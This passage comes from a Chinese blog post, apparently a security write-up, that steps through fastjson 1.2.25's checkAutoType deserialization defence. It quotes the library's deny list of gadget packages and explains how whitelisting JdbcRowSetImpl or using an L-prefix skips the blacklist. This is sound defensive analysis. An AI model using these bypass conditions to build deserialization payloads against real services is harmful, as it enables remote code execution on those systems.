alt=\"5efedf30915eee73c1f30a0f2e229e89.png\"></p>\n<p>这一操作在匹配黑白名单之后，Lcom.sun.rowset.JdbcRowSetImpl;恰好可以绕过黑名单中的限制。后续checkAutoType检测机制进行了一系列的安全加固，大体上都是黑名单防逆向分析、扩展黑名单列表等，但checkAutoType检测机制没有太大的改变。受篇幅影响，这里就不再详细分析了。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。在之后的版本中，随着checkAutoType安全机制被不断绕过，fastjson也进行了一系列例如黑名单防逆向分析、扩展黑名单列表等加固。但是checkAutoType的原理未曾有过大的变化，因此本文将以fastjson 1.2.25版本为例，介绍一下checkAutoType安全机制的原理。</p>\n<p>在调试分析fastjson的checkAutoType安全机制之前，发现网上很多fastjson漏洞的分析文章中曾经提到过一个名为autoTypeSupport的开关，且在1.2.25以及之后的版本中默认关闭。在动手调试之前，我曾一度以为autoTypeSupport开关关闭与否直接决定了fastjson是完全摒弃或是使用autotype功能的。但是实际调试中发现，这个开关仅仅是checkAutoType安全机制中的一个选项，这个开关的关闭与否，并不直接作用于fastjson是否使用autoType机制，下文案例中可以看出这个问题。</p>\n<p>fastjson在1.2.25以及之后的版本中引入的checkAutoType安全机制，位于com/alibaba/fastjson/parser/ParserConfig.java文件。但并不是所有情况下fastjson都会加载这个机制进行安全监测，让我们下面来看看究竟什么情况下这个安全机制会被触发。</p>\n<p>通过调试fastjson 1.2.25代码发现，如果想触发checkAutoType安全机制，需要执行到com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中下图红框处位置</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151506-61d5fbe4-dba2-1.png\" alt=\"0e5919b9c8a6af8d6128a67c5eeed81b.png\"></p>\n<p>在分析触发checkAutoType安全机制的情况之前，首先来看下什么情况下不会触发checkAutoType安全机制</p>\n<h2 id=\"不使用checkAutoType安全机制的情况\"><a href=\"#不使用checkAutoType安全机制的情况\" class=\"headerlink\" title=\"不使用checkAutoType安全机制的情况\"></a>不使用checkAutoType安全机制的情况</h2><p>fastjson将字符串转换为Java对象时，并不是都采用checkAutoType机制进行校验，以下两种情况均为使用checkAutoType机制</p>\n<ul>\n<li>json字符串中未使用@type字段</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待处理字符串中并不包含@type字段。在将这个普通的json字符串转换为java对象方法过程中并不执行到上文JavaBeanDeserializer.java中userType = config.checkAutoType(typeName, expectClass);位置</p>\n<ul>\n<li>Class&lt;T&gt; clazz与@type相同</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待处理的字符串@type指定的类与parseObject(String text, Class&lt;T&gt; clazz)中Class&lt;T&gt; clazz)参数指定的类相同，都是AutoTypeTest.Test1。在这种情况下，程序执行到下图红框处分支中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151546-7a078f20-dba2-1.png\" alt=\"c260c13f64e851f6bd19932a6f08760f.png\"></p>\n<p>上图中typeName变量值由@type值传递而来；beanInfo.typeName变量值由parseObject(String text, Class&lt;T&gt; clazz)中Class&lt;T&gt; clazz所指定。在Class&lt;T&gt; clazz值与@type值相同的情况下，程序进入上图红框中的if分支。而在这个分支中，程序不是被break就是被continue，而checkAutoType安全机制加载位置又处在该处if分支后面（上图552行），因此程序无论如何也不会执行到上图552行的checkAutoType安全机制中。</p>\n<p>由上文两个例子可见，在1.2.25以及之后的版本中，并不是所有的情况都需要经过checkAutoType这一关卡的。</p>\n<p>我们接下来看看如何触发checkAutoType安全机制，以及checkAutoType安全机制的原理。</p>\n<h2 id=\"使用checkAutoType安全机制的情况\"><a href=\"#使用checkAutoType安全机制的情况\" class=\"headerlink\" title=\"使用checkAutoType安全机制的情况\"></a>使用checkAutoType安全机制的情况</h2><p>通过分析可以发现，checkAutoType安全机制中也是针对不同情况不同处理的：checkAutoType安全机制处理流程受autoTypeSupport、parseObject参数等因素控制，这些因素共同影响checkAutoType安全机制是如何过滤以及处理传入的等待反序列化的json字符串</p>\n<p>总得来说，有如下几个元素共同作用影响checkAutoType选择哪种方式处理输入</p>\n<ul>\n<li>autoTypeSupport开关值（True/False）</li>\n<li>使用parseObject(String text, Class&lt;T&gt; clazz)或是parseObject(String text)（这里Class&lt;T&gt; clazz参数为应与@type字段不一样的值，否则不会触发checkAutoType）</li>\n</ul>\n<p>根据这两种条件，我们可以列出如下四种情况的表格</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>autoTypeSupport值</th>\n<th>parseObject(String text, Class&lt;T&gt; clazz)/ parseObject(String text)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>情况一</td>\n<td>False</td>\n<td>parseObject(String text)</td>\n</tr>\n<tr>\n<td>情况二</td>\n<td>False</td>\n<td>parseObject(String text, Class&lt;T&gt; clazz)</td>\n</tr>\n<tr>\n<td>情况三</td>\n<td>True</td>\n<td>parseObject(String text)</td>\n</tr>\n<tr>\n<td>情况四</td>\n<td>True</td>\n<td>parseObject(String text, Class&lt;T&gt; clazz)</td>\n</tr>\n</tbody></table>\n<p>接下来我们对上述四种情况逐一进行分析</p>\n<h3 id=\"autoTypeSupport值为False、使用parseObject-String-text\"><a href=\"#autoTypeSupport值为False、使用parseObject-String-text\" class=\"headerlink\" title=\"autoTypeSupport值为False、使用parseObject(String text)\"></a>autoTypeSupport值为False、使用parseObject(String text)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们来看一下这种情况下checkAutoType安全机制是如何进行处理的</p>\n<p>checkAutoType位于com/alibaba/fastjson/parser/ParserConfig.java中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">            String deny = denyList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">            String accept = acceptList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于autoTypeSupport为False，程序进入if (!autoTypeSupport)分支中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">        String deny = denyList[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">        String accept = acceptList[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>程序首先遍历denyList这一黑名单，并判断className与黑名单是否匹配</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151624-904c2f3e-dba2-1.png\" alt=\"934359dd24e91c0eae2b706a4721c00d.png\"></p>\n<p>这里需要说明一下：className变量是由typeName简单变换而来，而typeName即为@type字段值。详见下图代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151634-96d0d38c-dba2-1.png\" alt=\"c2e0aee6246db707820606da77be9959.png\"></p>\n<p>接下来看下黑名单中的元素</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151645-9d460688-dba2-1.png\" alt=\"fdc610a0d2a6392ae7f762de681b70e8.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">denyList =</span><br><span class=\"line\"><span class=\"string\">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果className命中黑名单，程序抛出”autoType is not support.”异常并结束</p>\n<p>在黑名单过滤完成后，程序还会将className与白名单匹配一下，下图中红框里的for循环即为白名单匹配过程</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151704-a8b4b780-dba2-1.png\" alt=\"0a39d8ffe2cf014fd9911637f87f606e.png\"></p>\n<p>程序将className与acceptList白名单进行匹配，通过动态调试查看以下默认白名单中的值</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151715-aee0e7fa-dba2-1.png\" alt=\"728bed570e73423cc97341d28103790d.png\"></p>\n<p>从动态调试的结果可见，acceptList默认情况下是一个空列表。</p>\n<p>开发者可以通过ParserConfig.getGlobalInstance().addAccept()自行向acceptList白名单中增加元素。如下代码向白名单中增加了一个AutoTypeTest.Test1类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().addAccept(<span class=\"string\">&quot;AutoTypeTest.Test1&quot;</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在白名单匹配环节，如果className指定的类与白名单中的项相匹成功，程序将该类的类对象赋值与clazz变量并返回</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151736-bbb9bede-dba2-1.png\" alt=\"65eefbeb121ed88086f2a3b56d0f52af.png\"></p>\n<p>程序接下来将传入的json字符串反序列为该类对象</p>\n<p>在程序执行完黑名单与白名单校验后，既没有匹配到黑名单，也没有匹配到白名单的话，程序最终会执行到下图分支</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151754-c5f10970-dba2-1.png\" alt=\"a5f4f7b4da2b416081ae013ea2ea93c9.png\"></p>\n<p>此时程序将抛出异常并结束</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151804-cc209b58-dba2-1.png\" alt=\"92d6e52681cbab4b63d15ef0f1d39667.png\"></p>\n<p>由于在1.2.25以及之后的版本中，autoTypeSupport值默认False。所以1.2.25以及之后的版本中假使攻击者构造的payload中的恶意类绕过了黑名单，但如果payload中的类不在白名单上，也是不能成功利用的。值得注意的是，白名单默认情况是空的。在此场景下payload想要执行成功，只有一种可能性：</p>\n<ul>\n<li>@type字段值在不在黑名单中且在白名单中</li>\n</ul>\n<h3 id=\"autoTypeSupport值为False、使用parseObject-String-text-Class-lt-T-gt-clazz\"><a href=\"#autoTypeSupport值为False、使用parseObject-String-text-Class-lt-T-gt-clazz\" class=\"headerlink\" title=\"autoTypeSupport值为False、使用parseObject(String text, Class&lt;T&gt; clazz)\"></a>autoTypeSupport值为False、使用parseObject(String text, Class&lt;T&gt; clazz)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test.class);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意上图，这里parseObject中的Class&lt;T&gt; clazz参数是AutoTypeTest.Test.class，而@type中的是AutoTypeTest.Test1，二者不是一个类。如果是一个类，根据上文checkAutoType触发条件分析，根本不会触发checkAutoType</p>\n<p>在这种情况下，我们再来看看checkAutoType会如何处理我们的数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">            String accept = acceptList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">            String deny = denyList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时autoTypeSupport为true，expectClass不为空，程序会首先进入if (autoTypeSupport || expectClass != null)分支</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151827-d9eab0a2-dba2-1.png\" alt=\"ecafe6fede023596c9569bc166e154ae.png\"></p>\n<p>值得注意的是，这个分支中是先匹配白名单，后匹配黑名单，如果@type字段指定的类在白名单中，则直接返回，不需要再经过黑名单过滤了。这一点很有意思，如果开发者因为开发失误，将存在利用的类加到了白名单里，攻击者是可以直接利用的</p>\n<p>回归正文，由于上图这里我们没有向白名单中增加AutoTypeTest.Test.class类，程序会接下来检查传入的类是否在黑名单中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151838-e0ad1222-dba2-1.png\" alt=\"93d672dc9d0fcd22ed5472e5ad1e7dd8.png\"></p>\n<p>如果匹配到黑名单，则直接抛出错误</p>\n<p>如果这里既没有匹配到白名单直接返回，也没有匹配到黑名单抛出错误终止，程序则继续向下执行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151852-e8b00d9e-dba2-1.png\" alt=\"e88c7abb2f44009cab7f6ed16955765e.png\"></p>\n<p>继续执行到的这个分支与情况一中的完全一致，又匹配了一遍黑名单与白名单。显而易见，这里既不会匹配到白名单，也不会匹配到黑名单</p>\n<p>最后程序执行到下图这里</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151904-efb62f74-dba2-1.png\" alt=\"0207749c04146ac393ecfe5159bb1d5b.png\"></p>\n<p>由于我们使用的是parseObject(String text, Class&lt;T&gt; clazz)这种方式，上图代码中872行处的expectClass即为Class&lt;T&gt; clazz传入的AutoTypeTest.Test.class类，而clazz变量为@type字段指定的AutoTypeTest.Test1.class类.程序通过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">expectClass.isAssignableFrom(clazz)</span><br></pre></td></tr></table></figure>\n\n<p>判断Class&lt;T&gt; clazz传入的expectClass对象所表示的类是否与@type字段指定的clazz变量参数表示的类相同，或者是其超类或父接口。本例中AutoTypeTest.Test.class类与AutoTypeTest.Test1.class类所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\&gt; AutoTypeTest.Test</span><br></pre></td></tr></table></figure>\n\n<p>如果二者相同或者是超类、父类关系，程序将@type字段指定的类对象返回，并随后将传入字符串反序列化为该类对象</p>\n<ul>\n<li>此场景的安全隐患</li>\n</ul>\n<p>通过上文的分析，在此场景下程序会先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则程序是会跳过黑名单校验的，例如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152135-4a20674a-dba3-1.png\" alt=\"e1fc601a50996f55f7a347bec030c7cc.png\"></p>\n<p>即使com.sun.rowset.JdbcRowSetImpl在Fastjson默认黑名单中，但在开发的时候，由于开发安全意识不强或开发疏忽等原因，将com.sun.rowset.JdbcRowSetImpl加入了白名单，此时是可以绕过黑名单直接执行利用的。在此场景下，payload想执行成功，有两种可能性：</p>\n<ul>\n<li><p>没有命中黑名单且Class&lt;T&gt; clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。</p>\n</li>\n<li><p>@type字段值在白名单中</p>\n</li>\n</ul>\n<h3 id=\"autoTypeSupport值为True、使用parseObject-String-text\"><a href=\"#autoTypeSupport值为True、使用parseObject-String-text\" class=\"headerlink\" title=\"autoTypeSupport值为True、使用parseObject(String text)\"></a>autoTypeSupport值为True、使用parseObject(String text)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">    System.out.println(obj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在此场景中，程序首先进入了与上一场景相同的分支，与上一场景不同的是，这里是由于autoTypeSupport为true而进入此分支，而非上一场景满足expectClass != null这一条件</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152202-59fb1002-dba3-1.png\" 